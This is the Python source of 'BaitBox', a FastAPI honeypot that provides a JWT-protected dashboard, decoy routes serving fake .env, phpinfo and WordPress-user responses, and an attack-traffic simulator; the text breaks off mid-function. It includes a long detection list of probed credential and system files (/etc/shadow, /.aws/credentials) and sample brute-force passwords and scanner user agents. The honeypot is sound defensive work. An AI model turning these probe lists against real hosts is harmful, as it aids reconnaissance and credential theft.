"""FastAPI dashboard and HTTP honeypot routes."""

from __future__ import annotations

import asyncio
import csv
import io
import json
import secrets
import threading
import time
from http.cookies import SimpleCookie
from ipaddress import ip_address
from urllib.parse import parse_qs
from pathlib import Path
from typing import Any

from fastapi import FastAPI, Form, Request, Response, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware

from ..db import get_recent_events, get_stats, log_event, persist_blocked_ip, persist_unblocked_ip
from .. import __version__
from ..pubsub import pubsub
from ..ratelimit import (
    block_ip,
    get_blocked_ips,
    get_connection_counts,
    is_blocked,
    is_rate_limited,
    record_connection,
    unblock_ip,
)

import jwt
import datetime as dt
import bcrypt
from fastapi.responses import RedirectResponse
from starlette.types import ASGIApp, Receive, Scope, Send
from ..config import settings
from ..db import get_user_password_hash

STATIC_DIR = Path(__file__).resolve().parents[1] / "static"
INDEX_HTML = STATIC_DIR / "index.html"
LOGIN_HTML = STATIC_DIR / "login.html"

APP_VERSION = __version__


def create_jwt_token(username: str, expires_delta: dt.timedelta | None = None) -> str:
    """Create a signed dashboard session token for a username."""
    if expires_delta is None:
        expires_delta = dt.timedelta(hours=settings.jwt_expiry_hours)
    now = dt.datetime.now(dt.UTC)
    payload = {
        "sub": username,
        "iat": now,
        "jti": secrets.token_hex(16),  # unique id → enables logout revocation
        "exp": now + expires_delta,
    }
    return jwt.encode(payload, settings.jwt_secret, algorithm="HS256")


# Revoked token ids (jti → expiry). Logout adds entries here so a stolen or
# leftover JWT immediately loses access without waiting for natural expiry.
_revoked_jtis: dict[str, float] = {}
_revocation_lock = threading.Lock()


def _revoke_token(token: str) -> None:
    """Add a token's jti to the revocation list until its natural expiry."""
    try:
        payload = jwt.decode(token, settings.jwt_secret, algorithms=["HS256"])
    except jwt.PyJWTError:
        return
    jti = payload.get("jti")
    exp = payload.get("exp", 0)
    if not jti:
        return
    with _revocation_lock:
        _revoked_jtis[jti] = float(exp)
        # Opportunistic cleanup of already-expired entries
        now = time.time()
        expired = [j for j, e in _revoked_jtis.items() if e <= now]
        for j in expired:
            del _revoked_jtis[j]


def verify_jwt_token(token: str) -> str | None:
    """Return the authenticated username for a valid, non-revoked token."""
    try:
        payload = jwt.decode(token, settings.jwt_secret, algorithms=["HS256"])
    except jwt.PyJWTError:
        return None
    jti = payload.get("jti")
    if jti:
        with _revocation_lock:
            if jti in _revoked_jtis:
                return None
    return payload.get("sub")


# Pre-computed hash of a random secret so unknown usernames cost the same
# bcrypt work as known ones (mitigates user-enumeration via timing).
_DUMMY_PASSWORD_HASH: str = bcrypt.hashpw(
    secrets.token_urlsafe(24).encode("utf-8"), bcrypt.gensalt()
).decode("utf-8")

# Dashboard login brute-force protection: failed attempts per IP.
_login_lock = threading.Lock()
_login_failures: dict[str, list[float]] = {}


def _client_key(request_or_ip: Any) -> str:
    if isinstance(request_or_ip, str):
        return request_or_ip
    return _client_ip(request_or_ip)


_MAX_LOGIN_TRACKED_IPS = 2048


def _record_login_failure(ip: str) -> None:
    with _login_lock:
        now = time.time()
        window_start = now - settings.login_rate_window_secs
        # Bound memory: a distributed attacker rotating source IPs must not be
        # able to grow this map without limit. Evict IPs whose whole failure
        # window has expired before falling back to a full reset.
        if len(_login_failures) >= _MAX_LOGIN_TRACKED_IPS and ip not in _login_failures:
            stale = [
                key for key, times in _login_failures.items()
                if not times or times[-1] < window_start
            ]
            for key in stale:
                _login_failures.pop(key, None)
            if len(_login_failures) >= _MAX_LOGIN_TRACKED_IPS:
                _login_failures.clear()
        failures = [t for t in _login_failures.get(ip, []) if t >= window_start]
        failures.append(now)
        _login_failures[ip] = failures


def _clear_login_failures(ip: str) -> None:
    with _login_lock:
        _login_failures.pop(ip, None)


def login_is_rate_limited(ip: str) -> bool:
    """Return True when the IP exceeded failed dashboard-login attempts."""
    with _login_lock:
        now = time.time()
        window_start = now - settings.login_rate_window_secs
        failures = [t for t in _login_failures.get(ip, []) if t >= window_start]
        return len(failures) >= settings.login_rate_limit


async def verify_user_credentials(username: str, password: str) -> bool:
    """Validate dashboard credentials against the configured bcrypt hash.

    Falls back to a dummy-hash comparison for unknown users so response
    timing does not reveal which usernames exist.
    """
    password_hash = await get_user_password_hash(username)
    password_bytes = password.encode("utf-8")
    if not password_hash:
        try:
            # bcrypt is deliberately slow; keep it off the event loop.
            await asyncio.to_thread(
                bcrypt.checkpw, password_bytes, _DUMMY_PASSWORD_HASH.encode("utf-8")
            )
        except Exception:
            pass
        return False
    try:
        return await asyncio.to_thread(
            bcrypt.checkpw, password_bytes, password_hash.encode("utf-8")
        )
    except Exception:
        return False


class AuthMiddleware:
    def __init__(self, app: ASGIApp):
        self.app = app

    async def __call__(self, scope: Scope, receive: Receive, send: Send) -> None:
        if scope["type"] not in ("http", "websocket"):
            await self.app(scope, receive, send)
            return

        path = scope.get("path", "")

        is_dashboard_route = _is_dashboard_route(path)
        is_public = path in ("/login", "/logout", "/api/auth/login", "/healthz", "/readyz")

        if is_dashboard_route and not is_public:
            headers = dict(scope.get("headers", []))
            cookie_header = headers.get(b"cookie", b"").decode("utf-8")

            cookie = SimpleCookie()
            cookie.load(cookie_header)
            token = cookie["session_token"].value if "session_token" in cookie else None

            if not token:
                auth_header = headers.get(b"authorization", b"").decode("utf-8")
                if auth_header.startswith("Bearer "):
                    token = auth_header[7:]

            if not token and scope["type"] == "websocket":
                query_string = scope.get("query_string", b"").decode("utf-8")
                params = parse_qs(query_string)
                if "token" in params:
                    token = params["token"][0]

            username = verify_jwt_token(token) if token else None
            if not username:
                if scope["type"] == "websocket":
                    await self._reject_websocket(send, 1008)
                    return
                elif path.startswith("/api/"):
                    await self._send_http_error(send, 401, "Unauthorized")
                    return
                elif path == "/metrics" and "text/html" not in headers.get(b"accept", b"").decode("utf-8").lower():
                    # Machine endpoint: a JSON 401 is clearer to Prometheus (which
                    # does not follow redirects) than a bounce to /login. Browsers
                    # that navigate here still get the login page.
                    await self._send_http_error(send, 401, "Unauthorized")
                    return
                else:
                    await self._send_redirect(send, "/login")
                    return

        await self.app(scope, receive, send)

    async def _reject_websocket(self, send: Send, code: int = 1008) -> None:
        """Refuse a WebSocket upgrade before accept (client sees HTTP 403).

        Sending an ``http.response.start`` message on a websocket scope is
        invalid ASGI and makes uvicorn raise, so close the handshake instead.
        """
        await send({"type": "websocket.close", "code": code})

    async def _send_http_error(self, send: Send, status_code: int, message: str) -> None:
        await send({
            "type": "http.response.start",
            "status": status_code,
            "headers": [
                (b"content-type", b"application/json"),
            ],
        })
        await send({
            "type": "http.response.body",
            "body": json.dumps({"detail": message}).encode("utf-8"),
        })

    async def _send_redirect(self, send: Send, location: str) -> None:
        await send({
            "type": "http.response.start",
            "status": 307,
            "headers": [
                (b"location", location.encode("utf-8")),
            ],
        })
        await send({
            "type": "http.response.body",
            "body": b"",
        })


class SecurityHeadersMiddleware:
    """Add baseline security headers to dashboard responses."""

    # Content-Security-Policy for the dashboard/login HTML. The UI relies on
    # inline scripts, inline event handlers and inline styles, so 'unsafe-inline'
    # is required; the value here is tightening every *external* source, locking
    # down object/base/framing, and giving the XSS-mitigating backstop.
    DASHBOARD_CSP = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' https://unpkg.com https://cdn.jsdelivr.net; "
        "style-src 'self' 'unsafe-inline' https://unpkg.com https://fonts.googleapis.com; "
        "font-src 'self' https://fonts.gstatic.com data:; "
        "img-src 'self' data: https://unpkg.com https://server.arcgisonline.com; "
        "connect-src 'self' ws: wss:; "
        "object-src 'none'; "
        "base-uri 'self'; "
        "frame-ancestors 'none'"
    )

    def __init__(self, app: ASGIApp):
        self.app = app

    async def __call__(self, scope: Scope, receive: Receive, send: Send) -> None:
        if scope["type"] != "http":
            await self.app(scope, receive, send)
            return

        async def send_with_headers(message: dict) -> None:
            if message["type"] == "http.response.start":
                headers = list(message.get("headers", []))
                extra = [
                    (b"x-content-type-options", b"nosniff"),
                    (b"referrer-policy", b"strict-origin-when-cross-origin"),
                    (b"permissions-policy", b"geolocation=(), microphone=(), camera=()"),
                ]
                if settings.hsts_enabled:
                    extra.append((b"strict-transport-security", f"max-age={settings.hsts_max_age}; includeSubDomains".encode()))
                content_type = ""
                for key, value in headers:
                    if key.lower() == b"content-type":
                        content_type = value.decode("latin-1").lower()
                        break
                if "text/html" in content_type:
                    extra.append((b"content-security-policy", self.DASHBOARD_CSP.encode()))
                existing = {k.lower() for k, _ in headers}
                for key, value in extra:
                    if key not in existing:
                        headers.append((key, value))
                message = {**message, "headers": headers}
            await send(message)

        await self.app(scope, receive, send_with_headers)


app = FastAPI(
    title="BaitBox",
    description="A lightweight honeypot with a real-time dashboard.",
    version=APP_VERSION,
    # Never advertise the real API surface to honeypot visitors.
    docs_url=None,
    redoc_url=None,
    openapi_url=None,
)
app.add_middleware(SecurityHeadersMiddleware)
app.add_middleware(AuthMiddleware)
# Note: CORS is permissive for honeypot purposes to capture all traffic.
# Credentials are not allowed cross-origin (invalid per the fetch spec and
# unnecessary — the dashboard is same-origin).
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

_DASHBOARD_API_EXACT_PATHS = {
    "/api/events",
    "/api/events/export",
    "/api/stats",
    "/api/sessions",
    "/api/attack-summary",
    "/api/ioc",
    "/api/simulate",
    "/metrics",
}

_DASHBOARD_API_PREFIXES = (
    "/api/sessions/",
    "/api/block/",
    "/api/unblock/",
    "/api/threat/",
    "/api/geoip/",
)


def _is_dashboard_route(path: str) -> bool:
    """Return True only for real dashboard routes that require authentication.

    BaitBox intentionally uses catch-all HTTP honeypot routes. Keeping the API
    auth matcher precise prevents common scanner targets such as
    ``/api/v1/users`` from being hidden behind dashboard authentication.
    """
    if path in ("/", "/ws/feed"):
        return True
    if path in _DASHBOARD_API_EXACT_PATHS:
        return True
    return any(path.startswith(prefix) for prefix in _DASHBOARD_API_PREFIXES)

# Decoy paths that emulate common attack targets
_DECOY_PATHS = {
    "/admin",
    "/administrator",
    "/phpmyadmin",
    "/wp-admin",
    "/wp-login.php",
    "/xmlrpc.php",
    "/shell",
    "/cmd",
    "/cgi-bin/bash",
    "/.env",
    "/config",
    "/.git/config",
    "/api/v1/users",
    "/actuator",
    "/actuator/env",
    "/console",
    "/manager/html",
    "/jmx-console",
    "/invoke",
    # Common scanner / exploit paths
    "/.aws/credentials",
    "/.docker/config.json",
    "/backup.sql",
    "/database.sql",
    "/db.sql",
    "/dump.sql",
    "/server-status",
    "/server-info",
    "/solr/admin",
    "/jenkins/login",
    "/hudson/login",
    "/.svn/entries",
    "/.DS_Store",
    "/crossdomain.xml",
    "/telescope/requests",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/boaform/admin/formLogin",
    "/HNAP1",
    "/sdk",
    # Additional common web attack paths
    "/admin/login",
    "/admin/login.php",
    "/administrator/index.php",
    "/user/login",
    "/login.php",
    "/auth/login",
    "/account/login",
    "/signin",
    "/signin.php",
    "/auth",
    "/auth.php",
    "/panel",
    "/panel.php",
    "/cpanel",
    "/webadmin",
    "/adminarea",
    "/adminarea.php",
    "/admincontrol",
    "/admincontrol.php",
    "/webmaster",
    "/webmaster.php",
    "/api/admin",
    "/api/admin/login",
    "/api/auth",
    "/api/auth/login",
    "/api/user",
    "/api/users",
    "/api/config",
    "/api/settings",
    "/api/database",
    "/api/db",
    "/setup.php",
    "/install.php",
    "/upgrade.php",
    "/configuration.php",
    "/settings.php",
    "/config.php",
    "/db_config.php",
    "/database.php",
    "/backup.php",
    "/backup.zip",
    "/backup.tar.gz",
    "/dump.php",
    "/download.php",
    "/upload.php",
    "/file.php",
    "/files.php",
    "/image.php",
    "/include.php",
    "/lib.php",
    "/loader.php",
    "/class.php",
    "/function.php",
    "/index2.php",
    "/home.php",
    "/test.php",
    "/debug.php",
    "/info.php",
    "/phpinfo.php",
    "/.htaccess",
    "/.htpasswd",
    "/.gitignore",
    "/.gitattributes",
    "/README.md",
    "/CHANGELOG.md",
    "/LICENSE",
    "/composer.json",
    "/package.json",
    "/package-lock.json",
    "/yarn.lock",
    "/pom.xml",
    "/build.gradle",
    "/gradle.properties",
    "/requirements.txt",
    "/Gemfile",
    "/Gemfile.lock",
    "/Procfile",
    "/Dockerfile",
    "/docker-compose.yml",
    "/docker-compose.yaml",
    "/.env.local",
    "/.env.development",
    "/.env.production",
    "/.env.test",
    "/.env.staging",
    "/config/database.yml",
    "/config/secrets.yml",
    "/config/credentials.yml.enc",
    "/config/master.key",
    "/shared/config/credentials.yml.enc",
    "/shared/config/master.key",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/proc/version",
    "/proc/cpuinfo",
    "/proc/meminfo",
    "/windows/system32/config/sam",
    "/windows/win.ini",
}

# Prefix / suffix patterns for paths not in the exact set above
_DECOY_PREFIXES = (
    "/.git/", "/.svn/", "/.aws/", "/vendor/phpunit/", "/boaform/",
    "/.docker/", "/.kube/", "/.config/", "/ssh/", "/api/",
    "/admin/", "/wp-content/", "/wp-includes/", "/wp-json/", "/node_modules/",
    "/vendor/", "/src/", "/lib/", "/include/", "/classes/",
)
_DECOY_SUFFIXES = (
    ".sql", ".bak", ".zip", ".tar.gz", ".env", ".log", ".tmp",
    ".swp", ".swo", ".old", ".backup", ".dump", ".db", ".sqlite",
    ".json", ".xml", ".yml", ".yaml", ".ini", ".conf", ".cfg",
    ".key", ".pem", ".crt", ".p12", ".pfx", ".jks", ".keystore",
)


def _is_probe_path(path: str) -> bool:
    """Return True when an HTTP path looks like a scanner or exploit probe."""
    if path in _DECOY_PATHS:
        return True
    if any(path.startswith(prefix) for prefix in _DECOY_PREFIXES):
        return True
    return any(path.endswith(suffix) for suffix in _DECOY_SUFFIXES)

_FAKE_ENV = """APP_ENV=production
APP_KEY=base64:FakeBase64AppKeyBaitboxHoneypot==
DB_CONNECTION=mysql
DB_HOST=10.0.0.10
DB_DATABASE=production
DB_USERNAME=app_user
DB_PASSWORD=REDACTED_BY_BAITBOX
"""

# Fake robots.txt — deliberately advertises "hidden" juicy paths. Scanners
# treat Disallow entries as a target list, which is exactly the point.
_FAKE_ROBOTS = """User-agent: *
Disallow: /admin
Disallow: /administrator
Disallow: /phpmyadmin
Disallow: /backup.sql
Disallow: /config
Disallow: /.env
Disallow: /.git
Disallow: /wp-admin
Disallow: /panel

User-agent: Googlebot
Disallow: /admin
Disallow: /backup.sql
"""

# Fake phpinfo() page (trimmed) — rewards recon and fingerprints a vulnerable
# PHP stack worth probing further.
_FAKE_PHPINFO = """<!doctype html><html><head><title>phpinfo()</title></head><body>
<h1>PHP Version 8.1.2-1ubuntu2.14</h1>
<table>
<tr><td class="e">System </td><td>Linux {hostname} 5.15.0-94-generic #104-Ubuntu SMP x86_64 </td></tr>
<tr><td class="e">Server API </td><td>FPM/FastCGI </td></tr>
<tr><td class="e">document_root </td><td><i>/var/www/html</i> </td></tr>
<tr><td class="e">SMTP </td><td><i>localhost</i> </td></tr>
<tr><td class="e">mysql.default_socket </td><td><i>/var/run/mysqld/mysqld.sock</i> </td></tr>
<tr><td class="e">MYSQL_INCLUDE </td><td><i>-I/usr/include/mysql</i> </td></tr>
<tr><td class="e">allow_url_include </td><td><b>Off</b> </td></tr>
<tr><td class="e">display_errors </td><td><b>Off</b> </td></tr>
</table>
<h2>PHP Credits</h2>
</body></html>
"""

def _fake_wp_users() -> list[dict[str, Any]]:
    """Classic WordPress user-enumeration response (GET /wp-json/wp/v2/users)."""
    return [
        {
            "id": 1,
            "name": "admin",
            "url": "https://production.example.com",
            "description": "Site Administrator",
            "slug": "admin",
            "avatar_urls": {"24": "/avatar/admin.png", "96": "/avatar/admin.png"},
        },
        {
            "id": 2,
            "name": "deploy",
            "url": "",
            "description": "CI deployment account",
            "slug": "deploy",
            "avatar_urls": {"24": "/avatar/deploy.png", "96": "/avatar/deploy.png"},
        },
    ]


def _client_ip(request: Request) -> str:
    """Derive the attacker's source IP.

    X-Forwarded-For is honoured only when ``BAITBOX_TRUST_PROXY`` is enabled —
    otherwise a direct attacker could rotate the header to rotate identity and
    evade blocks/rate-limits.
    """
    if settings.trust_proxy:
        forwarded_for = request.headers.get("x-forwarded-for")
        if forwarded_for:
            # Only trust the left-most value; proxies append subsequent hops.
            candidate = forwarded_for.split(",", 1)[0].strip()
            try:
                return str(ip_address(candidate))
            except ValueError:
                pass
    return request.client.host if request.client else "unknown"


def _validate_ip(value: str) -> str:
    """Normalize and validate user-supplied IP path parameters."""
    try:
        return str(ip_address(value))
    except ValueError as exc:
        raise ValueError(f"Invalid IP address: {value}") from exc


def _limit_value(limit: int, maximum: int = 500) -> int:
    """Safely clamp a limit value between 1 and maximum."""
    try:
        limit = int(limit)
    except (ValueError, TypeError):
        return 1
    return min(max(limit, 1), maximum)


def _enrich_event(event: dict[str, Any]) -> dict[str, Any]:
    """Attach cached GeoIP and live anomaly threat metrics to an event dict."""
    try:
        from ..geoip import get_cached, schedule_lookup
        from ..anomaly import get_threat_score

        src_ip = event.get("src_ip", "")
        schedule_lookup(src_ip)
        geo = get_cached(src_ip)
        if geo:
            event["geo"] = geo
        threat = get_threat_score(src_ip)
        event["threat_score"] = threat["threat_score"]
        event["threat_level"] = threat["threat_level"]
        event["threat_reasons"] = threat["reasons"]
        event["mitre_techniques"] = threat.get("mitre_techniques", [])
        event["attack_categories"] = threat.get("attack_categories", [])
    except Exception:
        pass
    return event


async def _request_payload(request: Request) -> dict[str, Any]:
    """Safely extract and truncate request payload for logging.

    Reads the body incrementally so an oversized upload is capped at
    ``http_max_body_bytes`` instead of being buffered in memory in full.
    """
    max_bytes = max(0, settings.http_max_body_bytes)
    truncated = False
    stream = getattr(request, "stream", None)
    if stream is None:  # lightweight request doubles in tests have only body()
        try:
            body = await request.body()
        except Exception:
            body = b""
        truncated = len(body) > max_bytes
        body = body[:max_bytes]
    else:
        chunks: list[bytes] = []
        total = 0
        try:
            async for chunk in stream():
                remaining = max_bytes - total
                if len(chunk) > remaining:
                    if remaining > 0:
                        chunks.append(chunk[:remaining])
                        total += remaining
                    truncated = True
                    break
                chunks.append(chunk)
                total += len(chunk)
        except Exception:
            truncated = True
        body = b"".join(chunks)

    form_data: dict[str, Any] = {}
    if body:
        content_type = request.headers.get("content-type", "")
        try:
            if "application/json" in content_type:
                try:
                    parsed_json = json.loads(body.decode("utf-8", errors="replace"))
                    if isinstance(parsed_json, dict):
                        form_data = parsed_json
                    else:
                        form_data = {"raw_body": parsed_json}
                except json.JSONDecodeError:
                    form_data = {"raw_body": body.decode("utf-8", errors="replace")}
            elif "form" in content_type:
                parsed = parse_qs(body.decode("utf-8", errors="replace"), keep_blank_values=True)
                form_data = {key: values[-1] if values else "" for key, values in parsed.items()}
            else:
                form_data = {"raw_body": body.decode("utf-8", errors="replace")[:2048]}
        except Exception:
            form_data = {"raw_body": body.decode("utf-8", errors="replace")[:2048]}

    return {
        "method": request.method,
        "path": request.url.path,
        "query": str(request.url.query),
        "user_agent": request.headers.get("user-agent", "")[:512],  # Limit UA length
        "headers": {
            "host": request.headers.get("host", "")[:256],
            "referer": request.headers.get("referer", "")[:512],
        },
        "body": form_data,
        "body_truncated": truncated,
    }


async def _record_http_request(request: Request, event_type: str = "request") -> dict[str, Any]:
    src_ip = _client_ip(request)
    record_connection(src_ip, "HTTP")
    event = await log_event(src_ip, "HTTP", event_type, await _request_payload(request))
    await pubsub.publish(event)
    return event


@app.get("/login", response_class=HTMLResponse)
async def login_page() -> str:
    html = LOGIN_HTML.read_text(encoding="utf-8")
    # Only advertise/auto-fill the demo credentials while the shipped defaults
    # are still in effect — never leak a stale password hint in production.
    if settings.dashboard_username == "admin" and settings.dashboard_password == "admin":
        flag = "<script>window.BAITBOX_DEMO = true;</script>"
    else:
        flag = ""
    return html.replace("<!--DEMO_FLAG-->", flag)


@app.post("/login")
@app.post("/api/auth/login")
async def login(request: Request, username: str = Form(...), password: str = Form(...)) -> Response:
    src_ip = _client_ip(request)
    if login_is_rate_limited(src_ip):
        return JSONResponse(
            {"detail": "Too many failed login attempts. Try again later."},
            status_code=429,
            headers={"Retry-After": str(settings.login_rate_window_secs)},
        )
    if await verify_user_credentials(username, password):
        _clear_login_failures(src_ip)
        token = create_jwt_token(username)
        response = JSONResponse({"status": "ok"})
        response.set_cookie(
            key="session_token",
            value=token,
            httponly=True,
            samesite="lax",
            max_age=settings.jwt_expiry_hours * 60 * 60,
            secure=settings.session_cookie_secure,
        )
        return response
    _record_login_failure(src_ip)
    return JSONResponse(
        {"detail": "Invalid username or password"},
        status_code=401
    )


@app.get("/logout")
@app.post("/logout")
async def logout(request: Request) -> Response:
    # Revoke the presented JWT immediately (defence against token theft)
    token = request.query_params.get("token")
    if not token:
        auth = request.headers.get("authorization", "")
        if auth.startswith("Bearer "):
            token = auth[7:]
    if not token:
        cookie = request.cookies.get("session_token")
        token = cookie
    if token:
        _revoke_token(token)
    response = RedirectResponse(url="/login", status_code=307)
    response.delete_cookie(key="session_token")
    return response


@app.get("/", response_class=HTMLResponse)
async def dashboard() -> str:
    return INDEX_HTML.read_text(encoding="utf-8")


@app.get("/healthz")
async def healthz() -> dict[str, Any]:
    """Lightweight liveness probe for containers and orchestrators."""
    return {"status": "ok", "service": "baitbox", "version": app.version}


_FAVICON_SVG = (
    "<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'>"
    "<text y='.9em' font-size='90'>\U0001FAA7</text></svg>"
)


@app.get("/favicon.ico")
async def favicon() -> Response:
    """Emoji favicon so browser noise doesn't hit the catch-all honeypot."""
    return Response(_FAVICON_SVG, media_type="image/svg+xml")


@app.get("/readyz")
async def readyz() -> Response:
    """Readiness probe — verifies database connectivity."""
    try:
        events = await get_recent_events(limit=1)
        return JSONResponse({
            "status": "ready",
            "service": "baitbox",
            "version": app.version,
            "database": settings.database_type,
            "events_accessible": True,
            "event_count_sample": len(events),
        })
    except Exception as exc:
        return JSONResponse(
            {"status": "not_ready", "service": "baitbox", "error": str(exc)},
            status_code=503,
        )


@app.get("/api/events")
async def api_events(
    limit: int = 100,
    offset: int = 0,
    protocol: str | None = None,
    src_ip: str | None = None,
    event_type: str | None = None,
) -> list[dict[str, Any]]:
    events = await get_recent_events(
        limit=_limit_value(limit),
        offset=max(0, min(int(offset) if str(offset).isdigit() else 0, 100000)),
        protocol=protocol or None,
        src_ip=src_ip or None,
        event_type=event_type or None,
    )
    return [_enrich_event(ev) for ev in events]


@app.get("/api/events/export")
async def api_events_export(limit: int = 500, format: str = "json") -> Response:
    """Export recent events as JSON, CSV, CEF, or ECS for incident review and SIEM ingestion."""
    events = await get_recent_events(limit=_limit_value(limit, maximum=5000))
    fmt = format.lower()
    if fmt == "csv":
        output = io.StringIO()
        writer = csv.DictWriter(
            output,
            fieldnames=[
                "id", "timestamp", "src_ip", "protocol", "event_type",
                "threat_score", "threat_level", "mitre_techniques", "payload",
            ],
        )
        writer.writeheader()
        for raw_event in events:
            event = _enrich_event(dict(raw_event))
            writer.writerow({
                "id": event.get("id", ""),
                "timestamp": event.get("timestamp", ""),
                "src_ip": event.get("src_ip", ""),
                "protocol": event.get("protocol", ""),
                "event_type": event.get("event_type", ""),
                "threat_score": event.get("threat_score", ""),
                "threat_level": event.get("threat_level", ""),
                "mitre_techniques": ";".join(event.get("mitre_techniques", []) or []),
                "payload": json.dumps(event.get("payload", {}), sort_keys=True, default=str),
            })
        return Response(
            output.getvalue(),
            media_type="text/csv",
            headers={"Content-Disposition": "attachment; filename=baitbox-events.csv"},
        )
    elif fmt == "cef":
        from ..telemetry import export_cef_event
        cef_lines = [export_cef_event(_enrich_event(dict(ev))) for ev in events]
        return Response(
            "\n".join(cef_lines) + ("\n" if cef_lines else ""),
            media_type="text/plain",
            headers={"Content-Disposition": "attachment; filename=baitbox-events.cef"},
        )
    elif fmt == "ecs":
        from ..telemetry import export_ecs_event
        ecs_docs = [export_ecs_event(_enrich_event(dict(ev))) for ev in events]
        return JSONResponse({"events": ecs_docs, "count": len(ecs_docs)})

    enriched = [_enrich_event(dict(ev)) for ev in events]
    return JSONResponse({"events": enriched, "count": len(enriched)})


@app.get("/api/attack-summary")
async def api_attack_summary() -> dict[str, Any]:
    """Return aggregated telemetry across all detected attack vectors and MITRE ATT&CK techniques."""
    from ..anomaly import get_attack_summary
    return get_attack_summary()


@app.get("/metrics")
async def api_metrics() -> Response:
    """Prometheus scrape endpoint (text exposition format, auth-protected)."""
    if not settings.metrics_enabled:
        return JSONResponse({"detail": "Metrics disabled"}, status_code=404)
    from ..metrics import build_prometheus_metrics
    try:
        stats = await get_stats()
    except Exception:
        # DB trouble must not break metric scraping — in-memory gauges still work
        stats = {"total_events": 0, "by_protocol": [], "by_event_type": []}
    payload = build_prometheus_metrics(
        stats,
        blocked_count=len(get_blocked_ips()),
        session_count=len(_session_snapshot()),
    )
    return Response(
        payload,
        media_type="text/plain; version=0.0.4; charset=utf-8",
        headers={"Cache-Control": "no-store"},
    )


def _session_snapshot() -> list[dict[str, Any]]:
    from ..sessions import session_manager
    return session_manager.list_sessions()


@app.get("/api/ioc")
async def api_ioc(format: str = "json", limit: int = 1000) -> Response:
    """Indicator-of-Compromise feed: malicious IPs, credentials, probed paths.

    Formats: ``json`` (full feed), ``csv`` (flat table), ``txt`` (one IP per
    line, ready for ipset / nginx deny / CrowdSec blocklists).
    """
    from ..ioc import build_ioc_feed, ioc_feed_to_csv, ioc_feed_to_ip_list
    events = await get_recent_events(limit=_limit_value(limit, maximum=5000))
    feed = build_ioc_feed([_enrich_event(dict(ev)) for ev in events], blocked_ips=get_blocked_ips())
    fmt = format.lower()
    if fmt == "csv":
        return Response(
            ioc_feed_to_csv(feed),
            media_type="text/csv",
            headers={"Content-Disposition": "attachment; filename=baitbox-ioc.csv"},
        )
    if fmt == "txt":
        return Response(
            ioc_feed_to_ip_list(feed),
            media_type="text/plain",
            headers={"Content-Disposition": "attachment; filename=baitbox-ioc.txt"},
        )
    if fmt == "stix":
        from ..ioc import ioc_feed_to_stix
        return JSONResponse(
            ioc_feed_to_stix(feed),
            headers={"Content-Disposition": "attachment; filename=baitbox-ioc.stix.json"},
        )
    return JSONResponse(feed)


@app.get("/api/stats")
async def api_stats() -> dict[str, Any]:
    stats = await get_stats()
    # Append rate-limit data
    stats["top_connections"] = get_connection_counts()[:10]
    stats["blocked_ips"] = get_blocked_ips()
    return stats


@app.post("/api/simulate")
async def api_simulate_attack(request: Request) -> dict[str, Any]:
    """Generate realistic simulated attack traffic for testing and live demonstration."""
    import random
    import time
    from ..geoip import _cache_put, _TTL

    body: dict[str, Any] = {}
    try:
        parsed = await request.json()
        if isinstance(parsed, dict):
            body = parsed
    except Exception:
        pass
    scenario = body.get("scenario", "ssh_bruteforce")

    attacker_profiles = [
        {"ip": "185.220.101.42", "country": "Germany", "countryCode": "DE", "city": "Frankfurt", "lat": 50.1109, "lon": 8.6821, "isp": "Tor Exit Node"},
        {"ip": "45.154.255.89", "country": "Netherlands", "countryCode": "NL", "city": "Amsterdam", "lat": 52.3676, "lon": 4.9041, "isp": "Datawagon VPS"},
        {"ip": "194.26.29.112", "country": "Russia", "countryCode": "RU", "city": "Moscow", "lat": 55.7558, "lon": 37.6173, "isp": "Aeza Hosting"},
        {"ip": "103.149.28.18", "country": "Japan", "countryCode": "JP", "city": "Tokyo", "lat": 35.6762, "lon": 139.6503, "isp": "Cloud Hosting JP"},
        {"ip": "198.51.100.77", "country": "United States", "countryCode": "US", "city": "San Francisco", "lat": 37.7749, "lon": -122.4194, "isp": "DigitalOcean LLC"},
        {"ip": "177.54.144.12", "country": "Brazil", "countryCode": "BR", "city": "São Paulo", "lat": -23.5505, "lon": -46.6333, "isp": "Telnet Botnet ISP"},
    ]

    generated: list[dict[str, Any]] = []

    if scenario == "ssh_bruteforce":
        target = random.choice(attacker_profiles)
        _cache_put(target["ip"], {
            "ip": target["ip"], "city": target["city"], "country": target["country"],
            "countryCode": target["countryCode"], "lat": target["lat"], "lon": target["lon"],
            "isp": target["isp"], "threat_score": 75,
        }, time.time() + _TTL)
        passwords = ["123456", "admin123", "password", "root", "ubuntu2024", "toor", "deploy!"]
        users = ["root", "admin", "deploy", "ubuntu", "postgres"]
        for _ in range(random.randint(3, 5)):
            user = random.choice(users)
            pwd = random.choice(passwords)
            ev = await log_event(target["ip"], "SSH", "auth_attempt", {
                "username": user,
                "password": pwd,
                "method": "password",
            })
            record_connection(target["ip"], "SSH")
            enriched = _enrich_event(dict(ev))
            await pubsub.publish(enriched)
            generated.append(enriched)

    elif scenario == "web_recon":
        target = random.choice(attacker_profiles)
        _cache_put(target["ip"], {
            "ip": target["ip"], "city": target["city"], "country": target["country"],
            "countryCode": target["countryCode"], "lat": target["lat"], "lon": target["lon"],
            "isp": target["isp"], "threat_score": 60,
        }, time.time() + _TTL)
        paths = ["/.env", "/wp-login.php", "/.git/config", "/actuator/env", "/phpmyadmin", "/etc/passwd", "/api/v1/users"]
        uas = ["sqlmap/1.7.2#stable", "Mozilla/5.0 (compatible; Nmap Scripting Engine)", "Nikto/2.1.6", "Go-http-client/1.1"]
        for p in random.sample(paths, k=min(4, len(paths))):
            ev = await log_event(target["ip"], "HTTP", "credential_probe", {
                "method": "GET",
                "path": p,
                "query": "",
                "user_agent": random.choice(uas),
                "headers": {"host": "web-prod-01", "referer": ""},
                "body": {},
                "body_truncated": False,
            })
            record_connection(target["ip"], "HTTP")
            enriched = _enrich_event(dict(ev))
            await pubsub.publish(enriched)
            generated.append(enriched)

    elif scenario == "shell_intrusion":
        target = random.choice(attacker_profiles)
        _cache_put(target["ip"], {
            "ip": target["ip"], "city": target["city"], "country": target["country"],
